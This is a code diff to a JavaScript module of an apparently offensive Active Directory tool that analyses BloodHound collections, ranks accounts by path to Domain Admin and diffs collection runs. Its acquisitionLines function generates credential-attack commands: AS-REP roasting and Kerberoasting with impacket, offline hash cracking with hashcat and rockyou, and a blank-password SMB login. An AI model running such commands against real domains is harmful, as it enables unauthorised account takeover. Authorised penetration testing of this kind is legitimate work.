@@ -503,6 +503,159 @@
     return { principal: principal, controls: list, groups: Object.keys(groups).sort(), count: list.length };
   }
 
+  // The per-principal weaknesses the collection ITSELF indicates for one account: the flags
+  // BloodHound carried on it (SPN, DONT_REQ_PREAUTH, PASSWD_NOTREQD) plus the census roles it
+  // landed in. Shape-based membership check (short name, case-insensitive) against the already
+  // derived census lists, so it is general to any collection and needs no re-scan of the graph.
+  function principalProfile(summary, principal) {
+    summary = summary || {};
+    var g = summary._graph || {};
+    var names = g.names || {}, types = g.types || {};
+    var short = String(principal == null ? '' : principal).split('@')[0].toUpperCase();
+    function inList(list) {
+      return (list || []).some(function (x) { return String(x).split('@')[0].toUpperCase() === short; });
+    }
+    var sid = '', type = '';
+    Object.keys(names).forEach(function (s) {
+      if (String(names[s]).split('@')[0].toUpperCase() === short) { sid = s; type = types[s] || ''; }
+    });
+    return {
+      name: principal, short: short, sid: sid, type: type,
+      kerberoastable: inList(summary.kerberoastable),
+      asrep_roastable: inList(summary.asrep_roastable),
+      password_not_required: inList(summary.password_not_required),
+      dcsync: inList(summary.dcsync_principals),
+      unconstrained: inList(summary.unconstrained_delegation),
+      high_value: inList(summary.high_value),
+    };
+  }
+
+  // Data-INDICATED ways to acquire a non-owned account, drawn ONLY from that account's own
+  // BloodHound attributes (no generic host-enumeration noise): an SPN => Kerberoast, DONT_REQ_PREAUTH
+  // => AS-REP roast, PASSWD_NOTREQD => a blank-password check. Returns [{why, cmd}] (possibly empty,
+  // meaning the account has no self-evident weakness and must be reached over a control path instead).
+  // ctx fills the DC/domain, and ctx.you (an account you already own) authenticates the Kerberoast.
+  function acquisitionLines(summary, principal, ctx) {
+    ctx = ctx || {};
+    var p = principalProfile(summary, principal);
+    var dc = ctx.dc || '<dc-ip>';
+    var domain = (summary && summary.domain) || '<domain>';
+    var tgt = p.short;
+    var low = tgt.toLowerCase();
+    var you = ctx.you ? String(ctx.you).split('@')[0] : null;
+    var out = [];
+    if (p.asrep_roastable) {
+      out.push({ why: 'DONT_REQ_PREAUTH: AS-REP roast, no credential needed.',
+        cmd: 'impacket-GetNPUsers ' + domain + '/' + tgt + ' -no-pass -dc-ip ' + dc + ' -format hashcat' });
+      out.push({ why: 'Crack the AS-REP hash offline.',
+        cmd: 'hashcat -m 18200 ' + low + '.asrep /usr/share/wordlists/rockyou.txt' });
+    }
+    if (p.kerberoastable) {
+      var auth = (you ? (domain + '/' + you) : (domain + '/<youruser>')) + ":'<password>'";
+      out.push({ why: 'Has an SPN: Kerberoast (needs any one valid domain credential).',
+        cmd: 'impacket-GetUserSPNs ' + auth + ' -request-user ' + tgt + ' -dc-ip ' + dc });
+      out.push({ why: 'Crack the TGS hash offline.',
+        cmd: 'hashcat -m 13100 ' + low + '.kerb /usr/share/wordlists/rockyou.txt' });
+    }
+    if (p.password_not_required) {
+      out.push({ why: 'PASSWD_NOTREQD: may authenticate with a blank password, costs nothing to try.',
+        cmd: 'nxc smb ' + dc + ' -u ' + tgt + " -p ''" });
+    }
+    return out;
+  }
+
+  // Every named principal in the collection, ranked by closeness to Domain Admin (reusing
+  // nearestToGoal) then by name, so the tab can offer a "select an account to inspect" dropdown
+  // over ALL the data, not only the owned creds. opts.types filters by node type (plural, e.g.
+  // ['users','groups','computers']). hops is null for a principal with no derivable path to DA.
+  function principalList(summary, opts) {
+    opts = opts || {};
+    var g = (summary && summary._graph) || {};
+    var names = g.names || {}, types = g.types || {};
+    var hopMap = {};
+    (nearestToGoal(summary) || []).forEach(function (r) { hopMap[String(r.name).split('@')[0].toUpperCase()] = r.hops; });
+    var out = [], seen = {};
+    Object.keys(names).forEach(function (s) {
+      var t = types[s] || '';
+      if (opts.types && opts.types.indexOf(t) < 0) return;
+      var nm = names[s], short = String(nm).split('@')[0], key = short.toUpperCase();
+      if (!short || seen[key]) return; seen[key] = 1;
+      out.push({ name: nm, short: short, type: t, hops: (key in hopMap) ? hopMap[key] : null });
+    });
+    out.sort(function (a, b) {
+      var ah = a.hops == null ? Infinity : a.hops, bh = b.hops == null ? Infinity : b.hops;
+      return ah - bh || (a.short.toLowerCase() < b.short.toLowerCase() ? -1 : 1);
+    });
+    return out;
+  }
+
+  // ── collection diff (temporal: what changed between two SharpHound runs) ──────────────────
+  // A compact, comparable snapshot of a collection for diffing: the principals (SID -> name/type),
+  // the ABUSABLE control edges and MemberOf edges (the attack surface), and the high-signal census
+  // lists. Small (no raw objects), so a handful can be kept per engagement for a temporal diff.
+  function graphFingerprint(summary) {
+    var g = (summary && summary._graph) || {};
+    var names = g.names || {}, types = g.types || {};
+    var principals = {};
+    Object.keys(names).forEach(function (s) { principals[s] = { name: String(names[s]).split('@')[0], type: types[s] || '' }; });
+    return {
+      domain: (summary && summary.domain) || '', at: (summary && summary.ingested_at) || 0,
+      principals: principals,
+      control: (g.control || []).filter(function (e) { return ABUSABLE_ACE[e[1]]; }).map(function (e) { return [e[0], e[1], e[2]]; }),
+      members: (g.members || []).map(function (e) { return [e[0], e[1]]; }),
+      kerberoastable: (summary.kerberoastable || []).slice(),
+      asrep_roastable: (summary.asrep_roastable || []).slice(),
+      password_not_required: (summary.password_not_required || []).slice(),
+      dcsync_principals: (summary.dcsync_principals || []).slice(),
+      unconstrained_delegation: (summary.unconstrained_delegation || []).slice(),
+    };
+  }
+
+  // Diff two fingerprints (prev -> next): new/removed principals, new/removed abusable+MemberOf
+  // edges (the leverage that opened or closed), and the census-flag deltas (now Kerberoastable,
+  // no longer a DCSync principal, and so on). This is a temporal view BloodHound-CE does not give
+  // out of the box: re-collect after each foothold and obol says exactly what new leverage you earned.
+  function diffCollections(prev, next) {
+    if (!prev || !next) return null;
+    var pn = prev.principals || {}, nn = next.principals || {};
+    function nm(sid, src) { return (src[sid] && src[sid].name) ? src[sid].name : String(sid); }
+    var addedP = [], removedP = [];
+    Object.keys(nn).forEach(function (s) { if (!pn[s]) addedP.push(nn[s]); });
+    Object.keys(pn).forEach(function (s) { if (!nn[s]) removedP.push(pn[s]); });
+    function edgeIndex(fp) {
+      var idx = {};
+      (fp.control || []).forEach(function (e) { idx[e[0] + '|' + e[1] + '|' + e[2]] = { from: e[0], edge: e[1], to: e[2] }; });
+      (fp.members || []).forEach(function (e) { idx[e[0] + '|MemberOf|' + e[1]] = { from: e[0], edge: 'MemberOf', to: e[1] }; });
+      return idx;
+    }
+    var pe = edgeIndex(prev), ne = edgeIndex(next), addedE = [], removedE = [];
+    Object.keys(ne).forEach(function (k) { if (!pe[k]) { var e = ne[k]; addedE.push({ from: nm(e.from, nn), edge: e.edge, to: nm(e.to, nn) }); } });
+    Object.keys(pe).forEach(function (k) { if (!ne[k]) { var e = pe[k]; removedE.push({ from: nm(e.from, pn), edge: e.edge, to: nm(e.to, pn) }); } });
+    function flagDiff(key) {
+      var ps = {}, ns = {}, add = [], rem = [];
+      (prev[key] || []).forEach(function (x) { ps[String(x).split('@')[0]] = 1; });
+      (next[key] || []).forEach(function (x) { ns[String(x).split('@')[0]] = 1; });
+      Object.keys(ns).forEach(function (x) { if (!ps[x]) add.push(x); });
+      Object.keys(ps).forEach(function (x) { if (!ns[x]) rem.push(x); });
+      return { added: add.sort(), removed: rem.sort() };
+    }
+    var flags = {
+      dcsync_principals: flagDiff('dcsync_principals'),
+      kerberoastable: flagDiff('kerberoastable'),
+      asrep_roastable: flagDiff('asrep_roastable'),
+      password_not_required: flagDiff('password_not_required'),
+      unconstrained_delegation: flagDiff('unconstrained_delegation'),
+    };
+    var changed = !!(addedP.length || removedP.length || addedE.length || removedE.length
+      || Object.keys(flags).some(function (k) { return flags[k].added.length || flags[k].removed.length; }));
+    return {
+      changed: changed, from_at: prev.at, to_at: next.at,
+      principals: { added: addedP, removed: removedP },
+      edges: { added: addedE, removed: removedE },
+      flags: flags,
+    };
+  }
+
   // ── graph projection for the tab / report ────────────────────────────────────────────────
   var NODE_TYPE = {
     users: 'user', user: 'user', groups: 'group', group: 'group',
@@ -978,6 +1131,11 @@
     ownedPaths: ownedPaths,
     nearestToGoal: nearestToGoal,
     controls: controls,
+    principalProfile: principalProfile,
+    acquisitionLines: acquisitionLines,
+    principalList: principalList,
+    graphFingerprint: graphFingerprint,
+    diffCollections: diffCollections,
     pathsToGraph: pathsToGraph,
     domainView: domainView,
     domainActionCommands: domainActionCommands,
